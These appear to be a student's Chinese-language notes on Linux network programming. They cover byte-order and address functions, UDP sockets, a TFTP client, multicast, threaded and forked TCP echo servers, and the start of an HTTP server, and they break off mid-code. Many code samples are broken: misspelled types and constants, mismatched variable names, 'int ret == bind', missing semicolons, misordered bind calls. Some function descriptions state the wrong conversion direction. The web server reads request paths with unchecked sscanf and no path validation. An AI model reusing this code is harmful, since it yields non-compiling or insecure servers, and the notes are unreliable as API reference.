# 网络编程(物联网嵌入式)

## 一、协议：

定义：人为规定的数据传输的格式和方法

 FTP：文件传输协议

#### 

#### 网络分层结构：

![image-20210531163610156](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210531163610156.png)

##### OSI   7层模型（左图）

物理层：各种网络接口(双绞线)的类型，传输速率等等的一些物理特性

数据链路层：负责对数据帧的收发

网络层：负责判断数据包是否是该主机接收的，通过IP地址，使数据包能够最大可能的到达目的主机

传输层：数据包和程序通信的桥梁

会话层：保持连接的

表示层：数据解压缩、解码等等

应用层：应用程序

##### TCP/IP  四层模型（右图）

链路层：设备到设备 (帧对帧) 的收发

网络层：主机到主机的数据收发

传输层：进程到进程的数据收发

应用层：



##### 网卡：网络适配器

作用：用来发送接收数据，模拟信号转换为数字信号

特点：每个网卡都有一个全球唯一的标识id



**Mac地址：**  （48b  6字节）

​	mac地址是用来标识网卡的一个物理地址，物理地址不能改变

​	

**IP地址：**（ IPv4  32b / IPv6  128b ）

​	用来标识主机或网卡的一个虚拟IP

​	** IP地址分为两部分：主机id，子网id



**IP地址、子网掩码与网关：**

![image-20210603205718433](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210603205718433.png)

![image-20210603222750008](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210603222750008.png)



**回环地址：**（127.0.0.1 ~ 127.255.255.254）

​	功能：主要是测试本机的网络配置，能ping通127.0.0.1说明本机的网卡和IP协议安装都没有问题。

​	**注**：这些地址都将回环到本地主机中，不属于任何一个有类别的地址类，它代表设备的本地虚拟接口。



##### 端口：

port  每一个网络应用程序必须有一个端口，用来标识这个应用程序

端口的分类：

​			普通端口			2字节   0-65535   （2^16^-1）

​			知名端口            0-1023

​			动态端口            1024-65535

特点：

​	1.端口号是无符号短整型的类型

​	2.每个端口都拥有一个端口号

​	3.TCP/UDP维护各自独立的端口号

​	4.网络应用程序，至少要占用一个端口号，也可以占有多个端口号



### 开发流程（了解）（通信原理）

##### 两种网络架构模型：

C/S（客户端/服务器）、B/S（浏览器/服务器） 模型

​	



## 二、字节序：

**相关概念：**

异构计算机：指双方的大小端不同



#### 1）字节序特点

1、网络协议（网络环境）指定了通讯字节序必须是**大端格式**，统称**网络字节序**。主机无论大小端，统称**主机字节序**。

2、只有在多字节数据作为整体处理时才需要考虑字节序

3、运行在同一台计算机上的进程相互通信时，一般不用考虑字节序

4、异构计算机之间通讯，需要转换自己的字节序为网络字节序

![image-20210717161849872](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210717161849872.png)



#### 2）大小端转换函数 htonl() / htons() / ntohl() / htons()

函数定义：

如果主机和网络的字节序相同，函数不会颠倒数据；

如果主机和网络的字节序不相同，函数会颠倒数据。



1、**htonl 函数**（发送： 将**IPv4**地址从 主机字节序 转换为 网络字节序 ）

```c
//头文件
#include <arpa/inet.h>  

unit32_t htonl(uint32_t hostint32);
```

功能：

​	将32位主机 字节序数据 转换成 网络字节序数据

参数：

​	hostint32：待转换的32位主机字节序数据

返回值：

​	成功：返回网络字节序的值



2、**ntohl函数**（接收：将**IPv4**地址从 网络字节序 转为 主机字节序）

```c
//头文件
#include <arpa/inet.h>  

uint32_t ntohl(uint32_t netint32);  //32位
```

功能：

​	将32位主机 字节序数据 转换成 网络字节序数据

参数：

​	uint32_t：unsigned int

​	netint32：待转换的32位网络字节序数据

返回值：

​	成功：返回主机字节序的值



3、**htons函数**（发送：将 主机字节序的**端口** 转换成 网络字节序的**端口**）

```c
//头文件
#include <arpa/inet.h>

uint16_t htons(uint16_t hostint16); //16位
```

功能：

​	将16位主机 字节序数据 转换成 网络字节序数据

参数：

​	uint16_t：unsigned short int

​	hostint16：待转换的16位主机字节序数据

返回值：

​	成功：返回网络字节序的值



4、**ntohs函数**（接收：将 网络字节序的**端口** 转换成 主机字节序的**端口**）

```c
 //头文件
#include <arpa/inet.h>

uint16_t ntohs(uint16_t hostint16); //16位
```

功能：

​	将16位主机 字节序数据 转换成 网络字节序数据

参数：

​	uint16_t：unsigned short int

​	netint16：待转换的16位网络字节序数据

返回值：

​	成功：返回主机字节序的值



#### 3）地址转换

IP地址；“192.168.0.111”  点分十进制数串（字符串）

计算机中的IP地址为32位：4字节



1、**inet_pton函数**（发送数据）

将点分十进制数串 转换成 32位网络字节序地址

```c
#include <arpa/inet.h>  //头文件
int inet_pton(int family, const char *strptr, void *addrptr);
```

功能：

​	将点分十进制数串转换成32位无符号整数

参数：

​	family  协议族  （IPv4：AF_INET     IPv6：AF_IENT6）

​	strptr   点分十进制数串

​	addrptr   32位无符号整数的地址

返回值：

​	返回 1，失败返回其他

*案例：*

```c
#include <stdio.h>
#include <arpa/inet.h>
int main()
{
    //点分十进制数串
    char *char_ip="192.168.0.111";
    //32位无符号整形数据
    unsigned int num_ip=0;
    
    //IPv4：AF_INET     IPv6：AF_IENT6
    inet_pton(AF_INET, str_ip, &num_ip);
    
    printf("str_ip = %s\n",str_ip);
    printf("num_ip = %u\n",num_ip); //1862314176
    
    //分析 num_ip 的4字节分布
    unsigned char *p = (unsigned char *)&num_ip;
    printf("%u %u %u%u\n", *p,*(p+1),*(p+2),*(p+3));
    return 0;
}
```

2、**inet_ntop函数**（接收数据）

将32位网络字节序IP 转换成 点分十进制数串

```c
#include <arpa/inet.h>  //头文件
const char *inet_ntop(int family, const void *addptr, char *strptr, size_t len); 
```

功能：

​	将32位无符号整数转换成点分十进制数串

参数：

​	family       协议族  （IPv4：AF_INET     IPv6：AF_IENT6）

​	strptr        点分十进制数串

​	addrptr     32位无符号整数的地址

​	len             strptr缓存区长度

len的宏定义

```c
#define INET_ADDRSTRLEN  16   //for IPv4
#define INET6_ADDRSTRLEN  46  //for IPv6
```

返回值：

​	成功：返回字符串首地址

​	失败：返回NULL

*案例：*

```c
#include<stdio.h>
#include<arpa/inet.h>
int main()
{
    //模拟一个32位网络字节序IP地址
    unsigned char p[]={192,168,0,111};
    
    char ip_str[16]="";
    inet_ntop(AF_INET, p, ip_str, 16);
    printf("ip_str=%s\n",ip_str);
    
    return 0;
}
```



## 三、UDP编程

#### 1.socket编程

主机进程间通信考虑的三大问题

1、不同协议的识别（TCP  UDP）

2、不同主机的识别（发送IP  接收IP）

3、不同进程的识别（发送端口  接收端口）

##### 特点：

1、socket也称 “ 套接字 ”

2、是一种文件描述符，代表了一个通信管道的一个端点

3、类似对文件的操作一样，可以使用read、write、close等函数对socket套接字进行网络数据的收取和发送等操作

4、得到socket套接字（描述符）的方法需要调用 socket() 函数

##### UDP报头

![image-20210929184131056](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929184131056.png)



#### 2.UDP的C/S架构

![image-20210718170659300](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210718170659300.png)

#### 3.socket函数

相关头文件：

```c
#include <sys/socket.h>
```

##### 3.1 创建socket套接字

```c
int socket(int family, int type, int protocol);
```

功能：

​	创建一个用于网络通信的socket套接字（描述符）

参数：

​	family：协议族（**AF_IENT**（IPv4）、**AF_IENT6**（IPv6）、**PF_PACKET**（链路层编程）等）

​	type：套接字类（**SOCK_STREAM**（TCP流式套接字）、**SOCK_DGRAM**（UDP数据报式套接字）、**SOCK_RAW**（原始套接字）等）

​	protocol：协议类别（**0**（自动检测）、**IPPROTO_TCP**（匹配TCP）、**IPPROTO_UDP**（匹配UDP）等）

返回值：

​	套接字

特点：

​	创建套接字时，系统不会分配端口

​	创建的套接字默认属性是主动的，即主动发起服务的请求

​	当作为服务器时，往往需要修改为被动的



##### 3.2 IPv4套接字地址结构：sockaddr_in

相关头文件：

```c
#include <netinet/in.h>
```

```c
struct in_addr
{
    in_addr_t s_addr;  //4字节
};

//IPv4地址结构
struct sockaddr_in
{
    sa_family_t sin_family; //2字节  协议
    in_port_t sin_port; //2字节  端口PORT
    struct in_addr sin_addr; //4字节  IP地址
    char sin_zero[8] //8字节
};

```

##### 3.3 通用地址结构：struct sockaddr

通常用（struct sockaddr*）来强制转换

```c
struct sockaddr
{
	sa_family_t sa_family; //2字节
    char sa_data[14] //14字节
};
```

##### 3.4 sendto函数   发送数据

```c
ssize_t sendto(int sockfd, const void *buf, size_t nbytes, int flags, const struct sockaddr *to,socklen_t addrlen);
```

功能：

​	向to结构体指针中指定的IP，发送UDP数据

参数：

​	sockfd：套接字								    	//往哪发

​	buf：发送数据缓冲区						  	//发送的数据

​	nbytes：发送数据缓冲区的大小			//发送消息的长度

​	flags：一般为0										//0为经典的套接字发送

​	to：指向目的主机地址结构体的指针	 //目的地址

​	addrlen：to所指向内容的长度			  //地址长度

注意：
	通过to和addrlen确定目的地址

​	可以发送0长度的UDP数据包

返回值：

​	成功：发送数据的字符数

​	失败：-1



##### 3.5 bind函数（绑定自身主机端口、IP）

```c
int bind(int sockfd, const struct sockaddr *myaddr,
         socklen_t addrlen);
```

功能：

​	将本地协议地址与sockfd绑定

参数：

​	sockfd：socket套接字

​	myaddr：指向特定协议的地址结构指针

​	addrlen：该地址结构的长度

返回值:

​	成功：返回0

​	失败：其他





*综合案例：*

```c
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>//socket
#include <sys/types.h>
#include <netinet/in.h>//struct sockaddr_in
#include <arpa/inet.h>//inet_pton

int main()
{
    //创建一个UDP通信的套接字
    //形参分别表示   IPv4地址  UDP套接字  自动获取协议类别
    int sockfd = socket(AF_INET,SOCK_DGRAM,0);
    printf("sockfd = %d\n",sockfd);
    
    //给套接字bind固定的信息
    struct sockaddr_in my_addr; //定义my_addr
    my_addr.sin_family = AF_INET;//设置本机协议
    my_addr.sin_port = htons(8000);//设置本机端口为8000
    my_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    //INADDR_ANY本值为0，目的是让系统自动寻找可用的本地IP地址 
    
    bind(sockfd, (struct sockaddr *)&my_addr, sizeof(my_addr));
    
    
    //发送数据
    //定义一个IPv4目的地址结构
    struct sockaddr_in dst_addr;
    
    //清空结构体
    //memset(&dst_addr,0,sizeof(dst_addr));
    bzero(&dst_addr，sizeof(dst_addr)); //另一种清零方式
    //赋值
    dst_addr.sin_family = AF_INET;//协议，设置为IPv4
    dst_addr.sin_port = htons(8070);//目的端口，主机字节序转为网络字节序
 inet_pton(AF_INET,"192.168.0.111",dst_addr.sin_addr.s_addr);//设置IP地址
    
    //发送 “hehe” 字符串
    sendto(sockfd, "hehe", strlen("hehe"), 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr))
    
    //关闭套接字
    close(sockfd);
    return 0;
}
```

**注意：**

​	如果UDP套接字没有绑定固定的IP、端口信息，那么第一次调用sendto时系统分配给本地主机IP以及一个临时端口（不确定的）；端口一旦绑定，后续继续发送信息时所用的端口不变。



##### 3.6 recvfrom函数  接收数据

```c
ssize_t recvfrom(int sockfd, void *buf, soze_t nbytes,      int flags, struct sockaddr *from, socklen_t *addrlen);
```

功能：

​	接收UDP数据，并将源地址信息保存在from指向的结构中

参数：

​	sockfd：套接字

​	buf：接收数据缓冲区

​	nbytes：接收数据缓冲区的大小

​	flags：套接字标志（通常为0）

​	from：源地址结构体指针，用来保存数据的来源

​	addrlen： from所指的长度

注意：

​	通过from和adrlen参数存放数据来源信息

​	from和addrlen可以为NULL，表示不保存数据来源

返回值

​	成功：接收到的字符数

​	失败：-1





*综合案例：*

```c
int main()
{
    //创建套接字
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    
    //如果收数据 尽量bind绑定端口
    struct sockaddr_in my_addr;
    bzero(&my_addr, sizeof(my_addr));
    bind(sockfd,(struck sockaddr *)&my_addr,sizeof(my_addr));
    //赋值my_addr
    my_addr.sin_family = AF_INET; //协议，IPv4
    my_addr.sin_port = htons(8000);  //端口，为8000
    my_addr.sin_addr.s_addr = htonl(INADDR_ANY);// 地址转换，自动寻找
    
    //
    while(1)
    {
      char buf[128]="";
        
        //不关心发送者信息
      int len = recvfrom(sockfd,buf,sizeof(buf),0,NULL,NULL)；
	  printf("len = %d\n",len);
      printf("buf = %s\n",buf);
        
        //具有发送者信息
      struct sockaddr_in from; 
      socklen_t from_len = sizeof(from);
      int len = recvfrom(sockfd,buf,sizeof(buf),0,(struct sockaddr *)&from,&from_len);//最后长度形参为地址，所以为&from_len
	  printf("len = %d\n",len);
      printf("buf = %s\n",buf);
      //打印发送者信息
        unsigned short port = ntohs(from.sin_port);//端口
        //将from中32位整形IP转换成点分十进制数串
        char ip[16] = "";
        inet_ntop(AF_IENT,&from.sin_addr.s_addr,ip,16);
      	printf("消息来自ip%s：%hu\n",ip,port);//发送者信息
        printf("buf = %s\n",buf);//发送内容
    }
    
    close(sockfd);
    return 0;
}
```

### 项目实践：UDPQQ





### TFTP编程

#### 1.Wireshark-win64-2.6.2使用

##### 1.1 安装与使用





##### 1.2 常用过滤规则

1.2.1 协议过滤

​	写上协议名称：tcp  udp  icmp  ip  arp  tftp

​	"and" 条件同时成立，"or" 只要有一个满足即可

1.2.2 

​	IP地址：

​	ip.addr==10.221.1.1   只要IP地址是10.221.1.1都要接受

​	ip.src==10.221.1.1       只接受源IP为10.221.1.1

​	ip.dst==10.221.1.1       只接受目的IP为10.221.1.1	

​	

​	UDP：

​	udp.port==8000           只要是 8000端口 都接受

​	udp.dstport==8000      只要是目的 8000端口 都接受

​	udp.srcport==8000      只要是源 8000端口 都接受



​	TCP：

​	tcp.port==8000             只要是 8000端口 都接受

​	tcp.dstport==8000        只要是目的 8000端口 都接受

​	tcp.srcport==8000        只要是源 8000端口 都接受



#### 2.TFTP协议

##### 1.1 概念

​	1.1.1 基于UDP协议实现，其编程思想与UDP一样

​	1.1.2 数据传输模式

​		octet：二进制模式

​		netascii：文本模式

​		mail：已不再支持

​	**协议的学习：通信过程（流程）、通信原理（协议）**



#####  1.2 TFTP通信过程总结

​	1.服务器在69号端口等待客户端的请求

​	2.服务器若批准此请求，则使用**临时端口**与客户端进行通信

​	3.每个数据包的编号都有变化（从1开始）

​	4.每个数据包都要得到**ACK的确认**，如果出现超时，则需要重新发送最后的包（数据或ACK）

​	5.数据长度都以**512Byte**传输，小于512Byte的数据意味着**传输结束**

![image-20210813145511012](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210813145511012.png)



##### 1.3 TFTP协议分析

![image-20210813152048254](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210813152048254.png)

**注意：**

​	1.以上的 “0” 是 '\0'

​	2.不同的差错码对应不同的错误信息

​	3.因为 ACK 中的块编号 “0” 用来回应OACK选项修改，所以数据传输是从编号 “1” 开始的



1.3.2 选项分类

*tsize选项：*

​		当读操作时，tsize选项的参数必须为 “0” ，

​		当写操作时，tsize选项参数应为待写入文件的大小，服务器会回复显示该选项

*blksize选项：*

​		修改传输文件时使用的数据块大小（范围：8 ~ 65464）

*timeout选项：*

​		修改默认的数据传输超时时间（单位：秒）



*代码案例：*（tftp客户端）

```c
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <fcntl.h>

int main(int argc,char *argv[])
{
    if(argc != 3)
    {
        printf("./a.out server_ip file_name\n");
        return 0;
    }
    
    //tftp是基于udp，所以是udp编程流程
    int sockfd = socket(AF_INET,SOCK_DGRAM,0);
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    
    //给tftp服务器发送 下载文件的请求
    //组tftp 文件读取请求报文
    unsigned char cmd[128]="";
    int len = sprintf(cmd,"%c%c%s%c%s%c",0x00,0x01,argv[2],0,"octet",0);
    
    //printf("strlen(cmd)=%d\n",strlen(cmd));
    //以上无法测量出报文长度，因为strlen函数是检测到“\0”就结束，而报文中可能包含多个“\0”
    
    //将请求cmd发给服务器的69号端口
    struct sockaddr_in server;
    bzero(&server,sizeof(server));
    server.sin_family, = AF_INET;
    server.sin_port = htons(69);
   inet_pton(AF_INET,argv[1],&server.sin_addr.s_addr);
    sendto(sockfd,cmd,len,0,(struct sockaddr *)&server,sizeof(server));
    
    //打开一个本地空文件
    int fd = open(argv[2],O_WRONLY|O_CREAT，0666);
    if(fd < 0)
    {
        perror("open");
        return 0;
    }
    
    //读取不同服务器传过来的文件数据
    unsigned short num=0; //
    while(1)
    {
        unsigned char buf[1024]="";
        struct sockaddr_in from;
        socklen_t from_len = sizeof(from);
        int len = recvfrom(sockfd,buf,sizeof(buf),0,(struct sockaddr *)&from,&from_len);
        
        //判断收到的数据的操作码，必须是00 03表示文件数据
        if(buf[1] == 0x03)//文件数据
        {
            //将文件数据写入到本地址文件中
        	if((num+1)==ntohs(*(unsigned short *)(buf+2)))	//防止接收重复数据
            {
                write(fd, buf+4, len-4);
                num = ntohs(*(unsigned short *)(buf+2));
            }
            
            //给服务器发送ACK回应
            buf[1] = 4;//把操作码赋值为4，即可回应
            //因为回应为4byte，sendto函数第三位可恒定为4
            sendto(sockfd,buf,4,0,(struct sockaddr *)&from,sizeof(from));
            
            if(len < 516) //即最后一一次文件数据接收
          	break;
        }
        
    }
    //关闭套接字
    close(sockfd);
    //关闭文件
    close(fd);
    return 0;
}
```



#### 3.广播



#### 4.多播组

##### 4.1多播地址结构体

​	在IPv4因特网域(AF_INET)中，多播地址结构体用如下结构体 ip_mreq 表示：

```c
struct in_addr
{
    in_addr_t s_addr;
};
struct ip_mreq
{
    struct in_addr imr_multiaddr; //多播组IP
    struct in_addr imr_interface; //将要添加到多播组的IP
};
```



##### 4.2多播套接口选项

```c
int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
//成功执行返回0，否则返回-1
```

![image-20210817164217172](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210817164217172.png)

**注：只能将自己加入到某个多播组，无法将别人加入到某个多播组**



*示例代码：*

```c
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <fcntl.h>
//将主机加入到多播组 224.0.0.2 接受
int main()
{
    int sockfd = socket(AF_INET,SOCK_DGRAM,0);
    
    //让sockfd有一个固定的IP端口
    struct sockaddr_in my_addr;
    bzero(&my_addr,sizeof(my_addr));
    my_addr.sin_family = AF_INET;//协议
    my_addr.sin_port = htons(8000);//端口
    my_addr.sin_addr.s_addr = htonl(INADDR_ANY);//自动寻址
    bind(sockfd,(struct sockaddr *)&my_addr,sizeof(my_addr));
    
    //将192.168.0.111 加入到多播组 224.0.0.2 中
    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr("224.0.0.2");
    //自动寻址192.168.0.111
    mreq.imr_interface.s_addr = htonl(INADDR_ANY);
    setsockopt(sockfd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq));
    
    
    while(1)
    {
        unsigned char buf[1500]="";
        recvfrom(sockfd,buf,sizeof(buf),0,NULL,NULL);
        printf("buf=%s\n",buf);
    }
    close(sockfd);
    
    return 0;
}
```



## 四、TCP协议

#### 1.客户端





#### 2.服务器——bind、listen、accept

##### 2.1 作为 TCP 服务器需要具备的条件

​	1）具备一个可以确知的地址 （bind函数）

​	2）让操作系统知道是一个服务器，而不是客户端 （listen函数）

​	3）等待链接的到来 （accept函数）

​	**对于面向连接的TCP协议来说，连接的建立才真正意味着数据通信的开始**



##### 2.2 bind示例

![image-20210818164607190](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210818164607190.png)



##### 2.3 listen 函数

```c
#include <sys/socket.h>  //头文件
int listen(int sockfd, int backlog);
```

功能：

​	1.将套接字由**主动**修改为**被动**。

​	2.使操作系统为该套接字设置一个**连接队列**，用来记录所有连接到该套接字		的连接。

![image-20210818165419986](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210818165419986.png)

参数：

​	sockfd：socket监听套接字

​	backlog：连接队列的长度

返回值：

​	成功：返回 0



##### 2.4 accept函数

```c
#include <sys/socket.h>  //头文件
int accept(int sockfd, struct sockaddr *cliaddr, socklen_t *addrlen);
```

功能：

​		从已连接队列中取出一个已经建立的连接，如果没有任何连接可用，则进入	睡眠等待（阻塞）

参数：

​		sockfd：socket监听套接字

​		cliaddr：用于存放客户端套接字地址结构

​		addrlen：套接字地址结构体长度的地址

返回值：

​		已连接套接字

![image-20210819173802057](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210819173802057.png)



#### 3. “三次握手、四次挥手”

##### 3.1 TCP的三次握手（客户端调用connect函数时发起）

​	第一次握手：客户端发送SYN请求，连接服务器

​	第二次握手：服务器ACK回应客户端的链接请求，同时服务器给客户端发出链接请求

​	第三次握手：客户端ACK回应服务器的链接请求

![image-20210821143029391](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210821143029391.png)

![image-20210821141701138](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210821141701138.png)



##### 3.2 TCP的四次挥手（调用close，激发底层发送FIN关闭请求	）

​	注意：不区分客户端或服务器的先后问题

![image-20210821145349356](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210821145349356.png)

​	第一次挥手：A调用close函数激发底层，发送FIN关闭请求，并且A处于**半关闭状态**

​	第二次挥手：B的底层给A回应ACK，同时导致B的应用层recv/read收到**0长度数据包**

​	第三次挥手：B调用close激发底层给A发送FIN关闭请求，并且B处于**半关闭状态**

​	第四次挥手：A的底层给B回应ACK，同时A处于**完全关闭状态**，B收到A的ACK也处于**完全关闭状态**



##### 3.3 套接字的关闭

![image-20210821153117652](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210821153117652.png)



#### 4.TCP并发服务器

并发服务器：同时服务于多个客户端

TCP并发服务器：本质是**TCP服务器**，**同时服务**于客户端



TCP并发服务器的注意点：

​	1）TCP服务器

​	2）提取多个客户端

​	3）开启进程或线程处理每个客户端



##### 4.1多线程（常用）

*示例代码：*

```c
#include <stdio.h> //
#include <string.h> //
#include <sys/socket.h> //
#include <netinet/in.h> //
#include <sys/types.h> //
#include <sys/stat.h>
#include <arpa/inet.h> //
#include <fcntl.h>
#include <pthread.h> //

void* deal_client_fun(void *arg) //arg = &new_fd
{
    //并发服务器的核心服务代码（各不相同，此处为echo服务器代码）
    //通过arg获得已连接套接字
    int fd = *(int *)arg;
    
    while(1)
    {
        //获取客户端的请求
    	char buf[128]="";
    	int len = recv(fd,buf,sizeof(buf),0);
    	if(len == 0)
        	break;
        //回应客户端
    	send(fd, buf, len, 0);
    }
    close(fd);
}

int main()
{
    //1.创建TCP监听套接字
    int sockfd = socket(AF_INET,SOCK_STREAM , 0);
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    
    //端口复用（参数为：套接字，套接字平台，使用复用方式，）
    int yes = 1;
setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    
    //2.给TCP监听套接字，bind固定的IP以及端口信息
    //（服务器必须绑定自己的IP地址）
    struct sockaddr_in my_addr;
    bzero(&myaddr, sizeof(my_addr));
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(8000);
    my_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	int ret == bind(sockfd, (struct sockaddr*)&my_addr,sizeof(my_addr));
    if(ret == -1) //判断是否已绑定，以及端口占用情况
    {
        perror("bind");
    }
    
    //3.调用listen将sockfd主动变被动，同时创建链接队列
    listen(sockfd, 10); //长度为10
    
    //4.提取完成链接的客户端 accept
    //accept 提取一次只能提取一个客户端，需要反复多次提取，用循环
    while(1)
    {
        struct sockaddr_in cli_addr;
        socklen_t cli_len = sizeof(cli_addr);
        int new_fd = accept(sockfd, (struct sockaddr*)&cli_addr, cli_len);// 获取成功连接的套接字
        
        //遍历客户端的信息ip、port
        unsigned short port = ntohs(cli_addr.sin_port);
        char ip[16] = "";
        inet_ntop(AF_INET, &cli_addr.sin_addr.s_addr, ip, 16);
        printf("已有客户端:%s:%hu连接上了服务器\n"ip,port);
        
        //对每一个客户端,开启一个线程，单独的服务于客户端
        pthread_t tid; //创建线程
        pthread_create(&tid,NULL, deal_client_fun, (void *)&new_fd);
        //线程分离
        pthread_detach(tid);
        
    }
    close(sockfd); //因为while循环，可能关不掉
    
    return 0;
}
```

​	**注意:上述代码，若客户端正常退出，无影响；若服务器意外退出，绑定的端口信息会来不及释放，会造成系统临时占用服务器上次bind的端口，如果在5~6分钟内再次运行服务器，会出现bind失败现象。**

![image-20210825150207903](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210825150207903.png)

​	解决：端口复用（仅仅是端口的复用）

​		服务器的进程网络资源仍然被占用，一般1分钟作用释放

```c
int yes = 1;
setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
```

​		此代码加在绑定（bind）之前



##### 4.2 多进程

*示例模板：*

![image-20210825154548843](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210825154548843.png)

*示例代码：*

```c
#include <stdio.h> //
#include <string.h> //
#include <sys/socket.h> //
#include <netinet/in.h> //
#include <sys/types.h> //
#include <sys/stat.h>
#include <arpa/inet.h> //
#include <fcntl.h>
#include <pthread.h> //
#include <unistd.h> //

void deal_client_fun(int fd) //fd = &new_fd
{ 
    while(1)//以下为服务器核心代码
    {
        //获取客户端的请求
    	char buf[128]="";
    	int len = recv(fd,buf,sizeof(buf),0);
    	if(len == 0)
        	break;
        //回应客户端
    	send(fd, buf, len, 0);
    }
    return;
}

int main()
{
    //1.创建TCP监听套接字
    int sockfd = socket(AF_INET,SOCK_STREAM , 0);
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    
    //端口复用（参数为：套接字，套接字平台，使用复用方式，）
    int yes = 1;
setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    
    //2.给TCP监听套接字，bind固定的IP以及端口信息
    //（服务器必须绑定自己的IP地址）
    struct sockaddr_in my_addr;
    bzero(&myaddr, sizeof(my_addr));
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(atoi(argv[1]));//命令参数argv[1]为端口名
    my_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	int ret == bind(sockfd, (struct sockaddr*)&my_addr,sizeof(my_addr));
    if(ret == -1) //判断是否已绑定，以及端口占用情况
    {
        perror("bind");
    }
    
    //3.调用listen将sockfd主动变被动，同时创建链接队列
    listen(sockfd, 10); //长度为10
    
    //4.提取完成链接的客户端 accept
    //accept 提取一次只能提取一个客户端，若需要反复多次提取，用循环
    while(1)
    {
        struct sockaddr_in cli_addr;
        socklen_t cli_len = sizeof(cli_addr);
        int new_fd = accept(sockfd, (struct sockaddr*)&cli_addr, cli_len);// 获取成功连接的套接字
        
        //遍历客户端的信息ip、port
        unsigned short port = ntohs(cli_addr.sin_port);
        char ip[16] = "";
        inet_ntop(AF_INET, &cli_addr.sin_addr.s_addr, ip, 16);
        printf("已有客户端:%s:%hu连接上了服务器\n"ip,port);
        
        pid_t pid;
        if(fork() == 0) //子进程 服务器客户端 无需监听套接字
        {
            //关闭监听套接字
            close(sockfd);
            //服务于客户端
            deal_client_fun(new_fd);
        	//关闭已连接套接字
            close(new_fd);
            _exit(-1); //释放
        }
        else //父进程
        {
            //监听新的连接到来 无需和客户端通信 必须关闭已连接套接字
            close(new_fd);
        }
    } 
    //关闭监听套接字
    close(sockfd); 
    
    return 0;
}
```



##### 4.3 总结

​	**TCP并发服务器 进程版：**父子进程，资源独立，某个进程结束，不会影响已有的进程，服务器更加稳定；代价是多进程，会消耗很多资源。

​	**TCP并发服务器 线程版：**线程共享进程资源，资源开销小；一旦主进程结束，所有线程都会结束，服务器相对进程不是那么稳定。



### HTTP 协议

#### 1.Webserver——HTTP协议

##### 1.1 概念

​	一种详细规定了浏览器和万维网服务器之间相互通信的规则，通过因特网传送万维网文档的数据传送协议。

##### 1.2 特点

​	1）支持C/S架构

​	2）简单快速：客户向服务器请求服务时，只需传送请求方法和路径，常用方法：**GET、POST**

​	3）无连接：限制每次连接只处理一个请求

​	4）无状态：即如果后续处理需要前面的信息，它必须重传，这样可能会导致每次连接传送的数据量会增大

#### 2.Webserver 通信过程

##### 2.1 通信框图（必须是TCP并发服务器，客户端由浏览器充当）

##### ![image-20210827151224311](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210827151224311.png)



#### 3.Web 编程开发

##### 3.1 网页浏览（GET方式）

​	主要思路：

![image-20210827153212586](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210827153212586.png)



*示例代码：*

```c
#include <stdio.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <sys/types.h> 
#include <sys/stat.h>
#include <arpa/inet.h> 
#include <fcntl.h>
#include <pthread.h> 
#include <unistd.h> 

//成功报文
char head[] = "HTTP/1.1 200 OK\r\n"    \
    "Content-Type: text/html\r\n"	  \
    "\r\n";

//失败报文
char err[] = "HTTP/1.1 404 Not Found\r\n"   \
    "Content-Type: text/html\r\n"   \
    "\r\n"   \
    "<HTML><BODY>File not found</BODY></HTML>";

void* deal_client_fun(void *arg)//arg = new_fdw
{
    int new_fd = (int)arg;
    //1、recv获取客户端的请求，只需调用一次
    unsigned char buf[512]= "";
    recv(new_fd, buf, sizeof(buf), 0);
    
    //2、解析buf，提取所请求的文件名
    char file_name[128] = "./html/"; //传入路径，html为文件名
    sscanf(buf, "GET /%s", file_name+7);//组包。备注："%*[^ ] / %s"
    //若没有文件（提取失败），提供并返回主页
    if(file_name[7]=='\0')
        char file_name[128]="./html/index.html";
    
    //3、打开本地文件
    int fd = open(file_name, O_RDONLY);
    if(fd < 0) //打开文件失败
    {
        perror("open");
        //发送失败报文
        send(new_fd, err, strlen(err));//sizeof多一个“\0”，会出问题
        
    }
    else //打开文件成功
    {
		//发送成功报文,请准备接收
